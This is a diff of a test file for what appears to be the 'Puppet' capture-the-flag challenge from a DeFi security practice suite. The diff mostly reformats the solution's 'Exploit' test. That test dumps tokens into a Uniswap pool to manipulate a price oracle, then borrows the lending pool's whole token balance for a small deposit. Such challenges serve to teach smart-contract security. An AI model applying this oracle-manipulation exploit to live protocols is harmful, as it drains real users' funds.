@@ -102,30 +102,29 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        const swapAmount = ethers.utils.parseEther('999');
-        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;   // deadline
+const swapAmount = ethers.utils.parseEther('999');
+const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;   // deadline
 
-        await this.token.connect(attacker).approve(
-            this.uniswapExchange.address,
-            swapAmount
-        );
+await this.token.connect(attacker).approve(
+    this.uniswapExchange.address,
+    swapAmount
+);
 
-        const val = await this.uniswapExchange.getTokenToEthInputPrice(
-          swapAmount,
-          { gasLimit: 1e6 }
-        );
+const val = await this.uniswapExchange.getTokenToEthInputPrice(
+  swapAmount,
+  { gasLimit: 1e6 }
+);
 
-        const amount = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
-          swapAmount,
-          val,
-          deadline,
-          { gasLimit: 100000 }
-        );
+const amount = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+  swapAmount,
+  val,
+  deadline,
+);
 
-        const steal = await this.token.balanceOf(this.lendingPool.address);
-        const deposit =  await this.lendingPool.calculateDepositRequired(steal);
+const steal = await this.token.balanceOf(this.lendingPool.address);
+const deposit =  await this.lendingPool.calculateDepositRequired(steal);
 
-        await this.lendingPool.connect(attacker).borrow(steal, { value: deposit });
+await this.lendingPool.connect(attacker).borrow(steal, { value: deposit });
     });
 
     after(async function () {
